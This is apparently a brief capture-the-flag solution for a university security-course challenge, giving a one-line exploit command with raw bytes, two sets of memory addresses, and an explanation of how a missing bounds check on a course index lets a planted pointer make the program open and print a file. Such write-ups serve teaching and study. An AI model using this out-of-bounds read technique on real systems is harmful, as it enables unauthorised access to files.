echo -e 'neverstandstill\n15 a\x88\xa0\x04\x08./COMP6447' | ./challenge

&courses == 0x804a048
&input_buf == 0x804a080

&courses == 0x0804B04C
&input_buf == 0x0804B080

- log in with password "neverstandstill"
- place a pointer to "./COMP6447" in the input buffer
- there's no bounds-checking on the course selection, so:
        &courses[14] == &input_buf
- give index 15, so that courses[15] == 0x0804a088 == "./COMP6447"
- COMP6447 is opened and printed
